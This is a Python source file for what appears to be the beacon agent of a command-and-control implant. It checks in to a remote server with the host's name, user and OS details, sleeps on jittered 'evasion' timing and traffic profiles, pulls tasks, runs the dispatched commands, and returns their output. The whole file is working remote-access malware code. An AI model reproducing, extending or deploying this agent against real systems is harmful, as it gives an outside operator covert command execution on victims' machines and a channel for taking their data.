import getpass
import platform
import sys
import time
import traceback

from common import config
from common import message_format as mf
from common.crypto import get_session_key
from common.logger import get_logger, update_session
from common.utils import TransportError
from agent.executor import execute
from transport.http_transport import send_beacon
from evasion.sleep_strat import get_sleep_fn
from transport.traffic_profile import load_active_profile

logger = get_logger('agent')

BEACON_ENDPOINT  = f'https://{config.SERVER_HOST}:{config.BACKEND_PORT}/beacon'

AGENT_VERSION    = '1.0.0'

class BackoffManager:
    # Manages exponential back-off state for retry logic

    _SEQUENCE = [1, 2, 4, 8, 16, 32, 60]  # delay steps in seconds, capped at 60

    def __init__(self):
        self.attempts = 0

    def compute_delay(self) -> float:
        # Return the delay for the current attempt, capped at the last sequence value.
        return float(self._SEQUENCE[min(self.attempts, len(self._SEQUENCE) - 1)])

    def reset(self) -> None:
        # Reset attempt counter after a successful operation.
        self.attempts = 0


# Helpers
def _build_checkin_payload() -> dict:
    # Build CHECKIN payload from current machine info.
    return mf.build_checkin(
        hostname   = platform.node(),
        username   = getpass.getuser(),
        os_info    = f'{platform.system()} {platform.release()} {platform.version()}',
        agent_ver  = AGENT_VERSION,
        jitter_pct = config.JITTER_PCT,
    )


def _send(payload: dict, key: bytes) -> dict:
    # Pack, send, unpack a beacon message — returns the server response dict.
    packed   = mf.pack(payload, key)
    raw_resp = send_beacon(BEACON_ENDPOINT, packed)
    return mf.unpack(raw_resp, key)

# BeaconLoop
class BeaconLoop:

    def __init__(self):
        self._session_id  = None
        self._key         = get_session_key()
        self._backoff     = BackoffManager()
        self._profile     = load_active_profile()  # load once at startup
        self._sleep_fn    = get_sleep_fn(self._profile.jitter_strategy)

    def _backoff_sleep(self, reason: str = '') -> None:
        # Sleep for the current back-off delay, log it, then increment attempt count.
        delay = self._backoff.compute_delay()
        logger.warning('backing off before retry', extra={
            'backoff_s':  delay,
            'attempt':    self._backoff.attempts + 1,
            'reason':     reason,
            'session_id': self._session_id,
        })
        time.sleep(delay)
        self._backoff.attempts = min(
            self._backoff.attempts + 1,
            len(BackoffManager._SEQUENCE) - 1,
        )

    def _reset_backoff(self) -> None:
        # Delegate reset to BackoffManager.
        self._backoff.reset()

    def _checkin(self) -> None:
        # Send CHECKIN and store the session_id assigned by the server.
        global logger

        payload  = _build_checkin_payload()
        response = _send(payload, self._key)

        self._session_id = (
            response.get('session_id') or
            response.get('payload', {}).get('session_id')
        )

        if not self._session_id:
            raise TransportError(
                'CHECKIN response missing session_id — server may have rejected checkin'
            )

        # Re-create logger with session_id so all subsequent logs are tagged
        logger = update_session(logger, self._session_id)

        logger.info('checkin complete', extra={
            'session_id': self._session_id,
            'hostname':   platform.node(),
        })

    def _handle_task_dispatch(self, response: dict) -> None:
        # Execute the dispatched task and send the result back to the server.
        inner     = response.get('payload', {})
        task_id   = inner.get('task_id', '')
        command   = inner.get('command', '')
        args      = inner.get('args', [])
        timeout_s = inner.get('timeout_s', 30)

        logger.info('task received', extra={
            'task_id': task_id,
            'command': command,
        })

        result = execute(task_id, command, args, timeout_s)

        result_payload = mf.build_task_result(
            session_id  = self._session_id,
            task_id     = result.task_id,
            stdout      = result.stdout,
            stderr      = result.stderr,
            exit_code   = result.exit_code,
            duration_ms = result.duration_ms,
        )
        _send(result_payload, self._key)

        logger.info('task result sent', extra={
            'task_id':   task_id,
            'exit_code': result.exit_code,
        })

    def run(self) -> None:
        # Run the full beacon loop — checkin then poll/execute until TERMINATE.
        logger.info('agent starting', extra={'endpoint': BEACON_ENDPOINT})

        # Step 1 — initial checkin with back-off retry
        while True:
            try:
                self._checkin()
                self._reset_backoff()
                break
            except TransportError as e:
                logger.warning('checkin failed', extra={'reason': str(e)})
                self._backoff_sleep(reason=str(e))
            except Exception as e:
                logger.error('checkin unexpected error', extra={
                    'reason':    str(e),
                    'traceback': traceback.format_exc(),
                })
                self._backoff_sleep(reason=str(e))

        # Step 2 — main beacon loop
        while True:
            try:
                # Step 2a — compute jittered sleep interval
                sleep_s = self._sleep_fn(
                    config.BEACON_INTERVAL_S,
                    self._profile.jitter_pct,
                )

                # Step 2b — sleep then send TASK_PULL
                logger.info('sleeping before beacon', extra={
                    'sleep_s':          round(sleep_s, 2),
                    'base_s':           config.BEACON_INTERVAL_S,
                    'jitter_pct':       self._profile.jitter_pct,
                    'jitter_strategy':  self._profile.jitter_strategy,
                    'session_id':       self._session_id,
                })
                time.sleep(sleep_s)

                # Step 2c — send TASK_PULL
                pull_payload = mf.build_task_pull(self._session_id)
                packed       = mf.pack(pull_payload, self._key)

                logger.info('beacon sent', extra={
                    'session_id':   self._session_id,
                    'payload_size': len(packed),
                })

                response = _send(pull_payload, self._key)
                msg_type = response.get('msg_type', '')
                self._reset_backoff()

                # Step 2d — task dispatched
                if msg_type == mf.MSG_TASK_DISPATCH:
                    self._handle_task_dispatch(response)

                # Step 2e — terminate signal
                elif msg_type == mf.MSG_TERMINATE:
                    logger.info('TERMINATE received — shutting down', extra={
                        'session_id': self._session_id,
                    })
                    sys.exit(0)

                # Step 2f — no task, continue loop
                else:
                    logger.info('no task', extra={'session_id': self._session_id})

            except TransportError as e:
                # Back-off on network failures — do not crash the agent
                logger.warning('transport error', extra={
                    'reason':     str(e),
                    'session_id': self._session_id,
                })
                self._backoff_sleep(reason=str(e))

            except Exception as e:
                # Log unexpected errors but keep the loop running
                logger.error('unexpected error in beacon loop', extra={
                    'reason':     str(e),
                    'traceback':  traceback.format_exc(),
                    'session_id': self._session_id,
                })
                self._reset_backoff()